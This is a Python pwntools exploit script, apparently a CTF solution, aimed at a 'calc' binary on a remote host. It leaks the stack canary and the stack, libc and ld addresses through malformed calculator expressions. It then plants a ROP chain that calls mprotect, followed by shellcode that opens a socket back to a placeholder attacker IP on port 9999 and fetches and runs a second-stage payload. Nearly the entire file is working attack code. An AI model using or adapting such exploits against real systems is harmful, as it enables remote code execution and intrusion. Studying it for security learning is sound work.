#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
from pwnlib.util.iters import bruteforce
from parse import *
import string
from hashlib import sha256

context.log_level="debug"
pwn_file="./calc"
elf=ELF(pwn_file)
libc=ELF("./libc.so.6")


stack_address=0
canary=0
libc_address=0
ld_address=0

if len(sys.argv)==1:
    conn=process(pwn_file)
    pid=conn.pid
else:
    conn=remote("47.89.11.82",10010)
    def brute_force(prefix,s):
        return bruteforce(lambda x:sha256(x+prefix).hexdigest()==s,string.ascii_letters+string.digits,length=4)

    data=conn.recvline(keepends=False)
    prefix,s=parse("sha256(xxxx+{}) == {}",data)
    conn.sendlineafter("Give me xxxx:\n",brute_force(prefix,s))
    pid=0

def debug():
    log.info("stack address: 0x%x"%stack_address)
    log.info("canary value : 0x%x"%canary)
    log.info("libc address: 0x%x"%libc_address)
    log.info("ld address:0x%x"%ld_address)
    log.info("process pid  : %d"%pid)
    pause()

conn.recv()
def calc(payload):
    conn.sendline(payload)
    conn.recvuntil(" = ")
    return int(conn.recvline())&0xFFFFFFFF

# leak canary
canary=calc("\x00")
# leak stack address
stack_address=(calc("++")-canary-0xad)&0xFFFFFFFF# main ebp
# leak libc & ld address
calc("0+*******0")
libc_address=(calc("++++++"))-0x1b2000
ld_address=libc_address+0x1c6000



gadget=lambda x:libc.search(asm(x)).next()+libc_address

pop_edx=gadget("pop edx ; ret")
pop_ecx_eax=gadget("pop ecx ;pop eax ; ret")
mov_gad=gadget("mov dword ptr [edx],eax;ret")
pop_eax=gadget("pop eax;ret")
pop_three=gadget("pop ebx ; pop esi ; pop ebp ; ret")
pop_four=gadget("pop ebx ; pop esi ; pop edi ; pop ebp ; ret")
# <main> :
# lea     esp, [ebp-0Ch]
# pop     ecx
# pop     ebx
# pop     esi
# pop     ebp
# lea     esp, [ecx-4]
# retn

# ROP
# mprotect
# jump buf

# rop befor canary
rop=[]
rop.append(libc_address+libc.symbols["mprotect"])
rop.append(pop_four)
rop.append(stack_address&0xfffff000)
rop.append(0x1000)
rop.append(7)
rop.append(0)


l=len(rop)
for i in range(l):
    calc("0("*(l-i)+str(rop[i]))

# rop after canary
rop=[]
rop.append(canary)#ebp-0x1c

code="""
    push 0
    push 1
    push 2
    push esp
    pop ecx
    push 1    
    jmp .+6
"""
shellcode=asm(code)
for i in range(0,len(shellcode),4):
    rop.append(u32(shellcode[i:i+4].ljust(4,"\x00")))

rop.append(stack_address-0x34)# ecx
# ebp-0x8
code="""
    pop ebx
    push 0x66
    pop eax
    int 0x80        /* build a socket */
    push 0xdeadbeef /* your ip */
    push 0x0f270002 /* port 9999*/
    mov ecx,esp
    push 0x10
    push ecx
    push 0
    jmp .-0x10b
"""
shellcode=asm(code)
for i in range(0,len(shellcode),4):
    rop.append(u32(shellcode[i:i+4].ljust(4,"\x00")))

#clear stack
calc("+"+"*"*20)

for i in range(len(rop))[::-1]:
    calc(str(rop[i])+"+"*(1+i)+"\x00")
    calc("0"+"*"*i+"+0\x00")

calc(str(stack_address-0x18)) # ret to stack
sleep(1)
# send shell code
code = """
.code32
    mov ecx,esp
    push 0x66
    pop eax
    push 0x3
    pop ebx
    int 0x80
    mov eax,ebx
    xor ebx,ebx
    mov edx,ecx
    int 0x80
    jmp ecx
"""
conn.send(asm(code))

pause()
